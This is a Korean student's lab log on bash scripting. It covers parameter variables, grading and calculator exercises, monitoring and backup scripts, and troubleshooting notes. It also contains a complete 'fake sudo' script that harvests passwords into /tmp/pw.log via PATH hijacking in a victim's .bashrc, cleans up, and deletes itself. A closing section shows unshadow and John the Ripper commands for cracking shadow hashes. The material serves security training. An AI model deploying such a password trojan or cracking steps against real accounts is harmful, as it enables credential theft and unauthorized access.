쉘 스크립트(실습)

이론에서 배운 변수·조건문·반복문·함수를 가지고 실제로 스크립트를 짜본 실습 기록이다. 단순 문법 연습을 넘어서 "페이크 sudo"로 PATH를 조작하는 공격 실습, 성적 계산기 같은 기본 문제, 사용자 등록 시스템·시스템 모니터링 리포트 같은 종합 시나리오 미션, 그리고 crontab 등록과 john the ripper를 이용한 무작위 대입공격까지 다뤘다. 삽질하고 고친 과정도 그대로 남겨둔다.

파라미터 실습

스크립트에 인수를 넘겨서 $0, $1, $2, $# 같은 특수 변수가 어떻게 채워지는지 확인해봤다.

#!/usr/bin/bash

echo "íprogram name: $0"
echo "first parameter: $1"
echo "second parameter: $2"
echo "third parameter: $3"

echo "parameter count: $#"

exit 0
  • 인수의 개수가 echo로 출력하려는 개수보다 많으면, 실제로 넘어온 인수 개수만큼만 출력된다.
  • exit 0 / exit 1은 함수의 return 0 / return 1과 같은 역할을 한다(스크립트의 종료 코드를 결정).

페이크 sudo를 작성하자

상황 설정

  • 동기 두 명(dev1, dev2)이 함께 입사했다.
  • dev1에게는 sudo 권한을 주고, dev2에게는 권한을 주지 않았다.
  • dev2는 자신만 sudo 권한이 없어 매번 동기에게 부탁해야 하는 게 싫어서, 권한을 탈취하기로 한다.
  • dev1이 sudo 계정으로 터미널을 켜둔 채 자리를 비운 사이, dev2가 다음 작업을 한다.
    1. 아래의 "가짜 sudo" 스크립트를 특정 디렉토리(/tmp/)에 넣어둔다.
    2. .bashrc에서 명령어 검색 경로(PATH)를 수정한다.
  • 자리에 돌아온 dev1이 새 터미널에서 sudo를 실행하면, dev2가 심어놓은 가짜 sudo가 먼저 실행되어 비밀번호가 로그 파일에 적힌다.
  • 탈취한 비밀번호로 dev1의 계정에 들어갈 수 있게 된다.

작동 스크립트 요구사항

  1. 암호 입력을 3회 받는다(맞든 틀리든 무조건 세 번 입력받는다).
    • [sudo] [사용자명] 암호: → 죄송합니다만, 다시 시도하십시오. 를 두 번 반복하고, 세 번째에는 sudo: 잘못된 암호 입력 시도 3번을 출력한다.
  2. 입력한 암호 값은 /tmp/pw.log 파일에 누적 저장한다.
  3. 세 번 입력이 끝나면 자기 자신(스크립트 파일)을 삭제한다.
  4. 종료한다.

해킹 같은 공격으로부터 암호를 입력받고, 흔적(자기 자신)을 지우는 코드를 작성하는 것이 목표였다.

#!/usr/bin/bash

# == 비밀번호 입력 받기1 ==
read -p "[sudo] $USER 암호: " -s passwd
echo -e "$(date)\t $USER\t $passwd" >> /tmp/pw.log
sleep 2
printf "\n죄송합니다만, 다시 시도하십시오.\n"

# == 비밀번호 입력 받기2 ==
read -p "[sudo] $USER 암호: " -s passwd
echo -e "$USER\t $passwd" >> /tmp/pw.log
sleep 2
printf "\n죄송합니다만, 다시 시도하십시오.\n"

# == 비밀번호 입력 받기3(마지막) ==
read -p "[sudo] $USER 암호: " -s passwd
echo -e "$USER\t $passwd\n" >> /tmp/pw.log
sleep 2
printf "\nsudo: 잘못된 암호 입력 시도 3번\n"

# == PATH 설정 변경하기 ==
export PATH=${PATH#/tmp:}
# sed -i '/^PATH=/d' ~/.bashrc      # PATH로 시작하는 줄을 삭제
sed -i 's/^PATH=.*$//g' ~/.bashrc   # PATH로 시작하는 줄을 공백으로 치환

# == 자기자신 삭제하기 ==
rm -rf $0

exit 0

실제 sudo처럼 보이도록 설정하기

  1. PATH를 수정해서 sudo를 실행할 때 /bin 내부의 진짜 sudo가 아니라 /tmp/ 밑에 내가 작성한 코드가 실행되도록 했다.
    • .bashrc 내부에 PATH=/tmp/:$PATH를 추가해서 설정한다.
    • 이 .bashrc는 공격 대상(타깃)의 설정 파일이다. (공격자가 solcho라는 계정으로 로그인해서 공격하는 과정으로 실습했다.)
    • 파일이 실행된 다음 삭제되기 전에 PATH 설정을 원래대로 되돌려줘야 의심을 받지 않는다.
  2. 실제 sudo는 비밀번호를 입력받고 오류 메시지가 뜨기까지 약 2초 정도 딜레이가 있어서, sleep 2를 코드에 넣어 흉내를 냈다.

.bashrc

  • 로그인할 때 실행되는 설정 파일 중 하나다.
  • 계정마다 .bashrc가 각각 존재한다.

결과

  1. /tmp/ 내부에 가짜 sudo가 있는 것을 확인했다.
  2. 새로운 접근(새 터미널)에서 sudo를 실행했다.
  3. 스크립트 내용대로 비밀번호를 입력받았다.
  4. 자기 자신(/tmp/sudo)이 삭제됐다.

환경변수 변경하기

$ export PATH=/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ PATH=/tmp/:$PATH

.bashrc나 /etc/profile 같은 설정 파일에서도 PATH를 수정할 수 있다(이 경우는 영구적으로 적용된다).

Part2 실습문제

Q1. 성적 계산기

사용자에게 점수(0~100)를 입력받아 A(90 이상) / B(80 이상) / C(70 이상) / D(60 이상) / F 학점을 if-elif-else 문으로 출력하는 스크립트다.

#!/usr/bin/bash
# == 성적 계산기==
# == 사용자에게 점수(0~100)을 입력받기 ==
read -p "점수를 입력하세요: " score

# == 학점 판별및 출력 ==
if [ $score -ge 90 ]; then
    echo "A 학점"
elif [ $score -ge 80 ]; then
    echo "B 학점"
elif [ $score -ge 70 ]; then
    echo "C 학점"
elif [ $score -ge 60 ]; then
    echo "D 학점"
else
    echo "F 학점"
fi

Q2. 홀짝 판별기

숫자를 입력받아 짝수/홀수를 판별하고, 추가로 그 수가 양수/음수/0인지도 출력한다. 힌트: $(( num % 2 )), -gt, -lt 활용.

#!/usr/bin/bash
# == 홀짝 판별기 ==
# == 숫자 입력받기==
read -p "숫자를 입력하세요: " number

# == 짝수/홀수 판별 ==
if [ $((num % 2)) -eq 0 ]; then
    parity="짝수"
else
    parity="홀수"
fi

# if [ $((number%2)) -eq 0 ] && [ $number -ne 0 ]; then
#     echo -n "짝수 "
# elif [ $((number%2)) -ne 0 ] && [ $number -ne 0 ]; then
#     echo -n "홀수 "
# fi

# == 양수/음수/0 판별 ==
if [ $number -lt 0 ]; then
    echo "음수입니다"
elif [ $number -eq 0 ]; then
    echo "0입니다"
else
    echo "양수입니다"
fi

여기서 처음에 parity를 구할 때 num이 아니라 실제 입력받은 변수인 number를 써야 하는데 오타를 낸 채로 남겨뒀다. 나중에 검토할 때 발견한 실수라 그대로 기록해둔다.

Q3. 파일 검사기

인수로 경로를 받아 일반파일 / 디렉토리 / 실행파일 / 존재하지 않음을, case문 없이 if문으로만 분기해서 출력하는 문제다.

모범답안

#!/bin/bash

# 첫 번째 인수로 전달받은 경로를 변수에 저장
target_path="$1"

# 인수가 비어있는지 검사 (방어적 프로그래밍)
if [ -z "$target_path" ]; then
    echo "사용법: $0 <검사할_경로>"
    exit 1
fi

# 파일 속성 검사 (if-elif-else 분기)
if [ ! -e "$target_path" ]; then
    echo "존재하지 않음"
elif [ -d "$target_path" ]; then
    echo "디렉토리"
elif [ -f "$target_path" ] && [ -x "$target_path" ]; then
    # 일반 파일이면서 동시에 실행 권한이 있는 경우
    echo "실행파일"
elif [ -f "$target_path" ]; then
    # 위 조건(-x)에 걸러지지 않은 나머지 일반 파일
    echo "일반파일"
else
    echo "기타 파일 (심볼릭 링크, 소켓 등)"
fi

모범답안은 인수가 비었는지 먼저 검사하는 방어적 코드가 들어가 있는데, 내가 처음 짠 코드에는 그 부분이 없어서 아래처럼 조건 순서가 조금 다르게 갔다.

#!/usr/bin/bash
# == 파일 검사기: 인수로 경로를 받아야 함 ==
# == if문으로 일반파일/디렉토리/실행파일/존재하지 않음 판별 ==

if [ -f $1 ] && ! [ -x $1 ]; then
    echo "일반파일입니다"
elif [ -d $1 ]; then
    echo "디렉토리입니다"
elif [ -f $1 ] && [ -x $1 ]; then
    echo "실행파일입니다"
elif ! [ -f $1 ]; then
    echo "파일이 존재하지 않습니다"
else
    echo "기타 파일입니다"
fi

Q4. 계산기 메뉴

case문으로 +, -, *, / 메뉴를 만들고 두 숫자를 입력받아 연산 결과를 출력한다. 단, 나눗셈일 때는 0으로 나누는 예외 처리를 포함해야 한다.

#!/usr/bin/bash
# == 계산기 메뉴 ==
# == 두 숫자 입력받기 ==
read -p "연산자를 입력하세요(+,-,*,/): " operator
read -p "숫자 2개를 공백으로 구분하여 입력하세요: " num1 num2

# == case문으로 +, -, *, / 결과 출력하기 ==
case $operator in
    "+")
        echo -e "\n$num1 + $num2 = $((num1+num2))\n"
        ;;
    "-")
        echo -e "\n$num1 - $num2 = $((num1-num2))\n"
        ;;
    "*")
        echo -e "\n$num1 * $num2 = $((num1*num2))\n"
        ;;
    "/")
        if [ $num2 -eq 0 ]; then
            echo -e "\n0으로는 나눌 수 없습니다\n"
        else
            echo -e "\n$num1 / $num2 = $((num1/num2))\n"
        fi
        ;;
    *)
        echo "유효하지 않은 연산자 값입니다."
        ;;
esac

여기서 배운 것: case문에는 항상 default(*) 값을 넣어주자. 어떤 입력이 들어올지 모르니 마지막 방어선을 만들어둬야 한다.

종합 실습 - 시나리오 미션

미션 A — 사용자 등록 시스템

이름, 나이, 권한레벨(1~3)을 입력받아 다음 단계를 수행한다.

  • 나이가 18세 미만이면 "미성년자 등록 불가" 출력
  • 권한레벨에 따라 일반/관리자/슈퍼관리자 역할 표시
  • 입력값 유효성 검사 포함

모범답안

#!/bin/bash
# 사용자 등록 시스템

read -p "이름을 입력하세요: " name
read -p "나이를 입력하세요: " age
read -p "권한 레벨 (1-3): " level

# 이름 유효성 검사
if [ -z "$name" ]; then
    echo "오류: 이름을 입력해야 합니다."
    exit 1
fi

# 나이 검사
if [ $age -lt 18 ]; then
    echo "미성년자($age세)는 등록할 수 없습니다."
    exit 1
fi

# 권한 레벨별 처리
case $level in
    1) role="일반 사용자" ;;
    2) role="관리자"     ;;
    3) role="슈퍼관리자" ;;
    *) echo "잘못된 레벨"; exit 1 ;;
esac

echo "──────────────────────────"
printf "이름  : %s\n" "$name"
printf "나이  : %d세\n" "$age"
printf "역할  : %s\n" "$role"
echo "등록이 완료되었습니다."

직접 짠 코드는 다음과 같다.

미션 B — 시스템 모니터링 리포트

현재 시스템 정보를 수집해서 리포트를 출력하는 미션이다.

  • $USER, $HOME, $SHELL, hostname, date 활용
  • 디스크 사용량(df)이 80% 초과 시 경고 메시지
  • 결과를 report_YYYYMMDD.txt로 저장

모범답안

#!/bin/bash

# 1. 날짜 기반 보고서 파일명 생성
# YYYYMMDD 형식으로 현재 날짜 추출
CURRENT_DATE=$(date +"%Y%m%d")
REPORT_FILE="report_${CURRENT_DATE}.txt"

# 2. 리포트 헤더 작성
# > (덮어쓰기)를 사용하여 스크립트 실행 시마다 새로운 파일 생성 또는 초기화
echo "==========================================" > "$REPORT_FILE"
echo "        시스템 상태 모니터링 리포트" >> "$REPORT_FILE"
echo "==========================================" >> "$REPORT_FILE"

# 3. 시스템 기본 정보 기록
# >> (이어쓰기)를 사용하여 파일 끝에 내용 추가
echo "[1. 기본 시스템 정보]" >> "$REPORT_FILE"
echo "- 점검 일시  : $(date +"%Y-%m-%d %H:%M:%S")" >> "$REPORT_FILE"
echo "- 호스트명   : $(hostname)" >> "$REPORT_FILE"
echo "- 현재 사용자: $USER" >> "$REPORT_FILE"
echo "- 홈 디렉토리: $HOME" >> "$REPORT_FILE"
echo "- 사용 쉘    : $SHELL" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# 4. 디스크 사용량 점검 및 경고 처리
echo "[2. 디스크 사용량 점검]" >> "$REPORT_FILE"

# 최상위 경로(/)의 디스크 사용량(%) 숫자만 추출하는 파이프라인
# 1) df -h / : 루트 파티션 정보 출력
# 2) awk 'NR==2 {print $5}' : 두 번째 줄(데이터 라인)의 5번째 열(Use%) 추출
# 3) sed 's/%//' : 추출된 문자열에서 '%' 기호 삭제하여 순수 숫자만 남김
DISK_USAGE=$(df -h / | awk 'NR==2 {print $5}' | sed 's/%//')

echo "- 현재 루트(/) 파티션 사용량: ${DISK_USAGE}%" >> "$REPORT_FILE"

# 디스크 사용량이 80%를 초과하는지 검사
if [ "$DISK_USAGE" -gt 80 ]; then
    echo "[경고] 디스크 사용량이 80%를 초과했습니다! 확인이 필요합니다." >> "$REPORT_FILE"
else
    echo "[안전] 디스크 사용량이 정상 범위 내에 있습니다." >> "$REPORT_FILE"
fi

echo "==========================================" >> "$REPORT_FILE"

# 터미널(화면)에는 완료 안내 메시지만 출력
echo "점검 완료: '$REPORT_FILE' 파일이 성공적으로 생성되었습니다."

미션 C(심화) — 백업 도구

인수로 소스 디렉토리를 받아 다음 단계를 수행한다.

  • 디렉토리 존재 여부 확인 후 없으면 오류 종료
  • backup_YYYYMMDD 형식으로 복사본 생성(모범답안에서는 cp지만, 실습에서는 tar로 압축해서 처리했다)
  • 백업 성공/실패 여부를 로그 파일에 기록

모범답안

#!/bin/bash

# 1. 인수로 소스 디렉토리 받기 및 변수 초기화
SOURCE_DIR="$1"
CURRENT_DATE=$(date +"%Y%m%d")
BACKUP_DIR="backup_${CURRENT_DATE}"
LOG_FILE="backup.log"

# 인수가 비어있는지 1차 확인
if [ -z "$SOURCE_DIR" ]; then
    echo "사용법: $0 <백업할_디렉토리>"
    exit 1
fi

# 2. 디렉토리 존재 여부 확인 (-d 옵션)
if [ ! -d "$SOURCE_DIR" ]; then
    echo "오류: '$SOURCE_DIR' 디렉토리가 존재하지 않습니다."
    # 실패 기록을 로그에 남기고 스크립트 강제 종료
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] 백업 실패: '$SOURCE_DIR' 존재하지 않음" >> "$LOG_FILE"
    exit 1
fi

# 3. 디렉토리 복사 (백업 수행)
echo "'$SOURCE_DIR' 디렉토리를 '$BACKUP_DIR'로 백업을 시작합니다..."
# 디렉토리를 통째로 복사하기 위해 -r (recursive) 옵션 사용
cp -r "$SOURCE_DIR" "$BACKUP_DIR"

# 4. 명령어 실행 결과(종료 상태)를 확인하여 로깅
# $? 는 바로 직전에 실행된 명령어(여기서는 cp)의 결과 코드를 담고 있습니다. (0이면 성공, 그 외는 실패)
if [ $? -eq 0 ]; then
    echo "백업이 성공적으로 완료되었습니다."
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] 백업 성공: '$SOURCE_DIR' -> '$BACKUP_DIR'" >> "$LOG_FILE"
else
    echo "백업 중 오류가 발생했습니다."
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] 백업 실패: 복사 과정에서 오류 발생" >> "$LOG_FILE"
fi

종합 실습 - 미션 B(시스템 모니터링 리포트) 디벨롭

기존 미션 B를 더 발전시켜서, 여러 시스템 지표를 주기적으로 HTML 파일로 만들어 웹에서 볼 수 있게 만드는 실습이다.

  • 출력 정보: vmstat(시스템), top -n1(CPU), df -h(디스크), netstat -i(네트워크), free(메모리)
  • 서비스 로그 정보: awk '{print $1}' var/log/nginx/access.log | sort | uniq -c | sort -r | head -n 5
  • 출력 주기: 10초
  • 출력 파일: /var/www/html/mon.html
  • 결과를 report_YYYYMMDD.txt로도 저장

처음 작성한 코드(/home/solcho/shell/log/syslog.sh)

#!/usr/bin/bash
# =========================================
# == 시스템 모니터링 리포트 ==
# 현재 시스템 정보를 수집하여 리포트 출력
# 출력 정보: vmstat(시스템), top -n1(cpu), df -h(디스크), netstat -i(네트워크), free(메모리)
# 출력 주기: 10초
# 출력: /var/www/html/mon.html
# 결과를 report_YYYYMMDD.txt로 저장
# =========================================

# == 함수 ==
# header 생성 함수
make_head() {
    # html 시작 부분
    echo "<!DOCTYPE html>"
    echo "<html lang="ko">"
    echo "<head>"
    echo "<meta charset="UTF-8" />"
    echo "<meta name="viewport" content="width=device-width, initial-scale=1.0" />"
    echo "<title>System Logging</title>"
    echo "</head>"
    echo "<body>"
}

# body 생성 함수
make_body() {
    # == 시스템(vmstat) ==
    echo "<h1>현재 시각: $(date)</h1>"
    echo "<h2>시스템 정보</h2>"
    vmstat
    echo "<br/><br/>"

    # == CPU(top -n1) ==
    echo "<h2>CPU 상태</h2>"
    top -bn1
    echo "<br/><br/>"

    # == 디스크(df -h) ==
    echo "<h2>디스트 정보</h2>"
    df -h
    echo "<br/><br/>"

    # == 네트워크(netstat -i) ==
    echo "<h2>네트워크 정보</h2>"
    netstat -i
    echo "<br/><br/>"

    # == 메모리(free) ==
    echo "<h2>메모리 정보</h2>"
    free
    echo "<br/><br/>"
}

# tail 생성 함수
make_tail() {
    echo "</body>"
}

# == 프로그램 본문 ==
# == 결과 리포트 이름 ==
REPORT_HTML="/var/www/html/mon.html"

# == 10초마다 출력 ==
while true; do
    make_head() > $REPORT_HTML
    make_body() >> $REPORT_HTML
    make_tail() >> $REPORT_HTML

    # 10초 대기
    sleep 10

done

이 버전은 함수를 호출할 때 make_head()처럼 괄호를 붙여서 호출했는데, 이게 나중에 트러블슈팅에서 발견한 에러의 원인이 됐다.

트러블슈팅

결과값 출력

  • 문제: 터미널에 출력되는 그대로(줄바꿈, 정렬 포함) HTML에도 출력하고 싶었다.
  • 해결: <pre> 태그를 사용했다. <pre>는 공백과 줄바꿈을 그대로 유지해서 보여주기 때문에 vmstat, df -h 같은 명령어의 출력 형태가 깨지지 않는다.

echo >> 문제 (해프닝)

함수 내에 echo가 여러 개 있다 보니, 함수 결과를 >>로 리다이렉트하는 방식에서 에러가 발생하는 줄 알았다.

echo -e "..." >> $REPORT_HTML처럼 한 번에 묶어서 처리하면 되는 줄 알았다.

→ 사실 여러 줄 echo가 문제가 아니라, 아래에 나오는 함수 호출 문법 자체의 에러 때문에 생긴 문제였다.

함수 사용 에러

  • 문제: 함수를 호출하는 방식 자체에 문제가 있다는 에러가 발생했다.
  • 원인: 쉘 스크립트에서 함수를 호출할 때는 make_head()처럼 괄호(())를 붙이지 않는다. 함수는 정의할 때만 괄호를 쓰고, 호출할 때는 그냥 make_head처럼 이름만 써야 한다.

전반적으로 교재나 강사님 힌트를 잘 보면 해결할 수 있는 문제였다. 혼자 코드 짜겠다고 매몰되지 말고 강사님 말을 잘 듣자.

가장 많이 사용되는 비밀번호를 모아놓은 딕셔너리 텍스트 파일이다.

  • 참고: https://weakpass.com/wordlists/weakpass_4.txt
  • 이 파일을 받아서 john으로 무작위 대입공격에 사용할 수 있다.
  • 실습에서는 실제 파일이 너무 커서, 일부만 받고 내 실제 비밀번호를 추가해서 사용했다.

john-the-ripper란

리눅스 환경에서 주로 사용되는 강력한 오픈소스 패스워드 보안 감사 및 크래킹 도구다. 무작위 대입공격을 수행할 수 있다.

실습 과정

  1. /etc/ 디렉토리 압축 해제: tar -xvzf /home/solcho/backup/backup.tar.gz ./etc
  2. passwd 파일과 shadow 파일을 합친다.
    • unshadow ./passwd ./shadow > mypass.txt
    • unshadow은 John the Ripper에 포함된 유틸리티로, /etc/passwd 파일과 /etc/shadow 파일을 하나의 파일로 병합하는 데 사용한다.
      리눅스는 보안을 위해 사용자 계정 정보(passwd)와 암호화된 실제 패스워드 해시(shadow)를 별도의 파일로 분리해서 관리하는데, unshadow는 이 두 정보를 결합해서 John the Ripper가 패스워드를 더 빠르고 정확하게 크랙(해독)할 수 있게 해준다.
  3. 해킹하고 싶은 계정만 남기고 나머지 줄은 삭제했다.
  4. 무작위 대입공격을 실행한다.
    • john --format=crypt --wordlist=./rockyou.txt.2025 ./mypass.txt
  5. 나중에 크랙된 내용을 다시 확인한다.
    • john --show ./mypass.txt
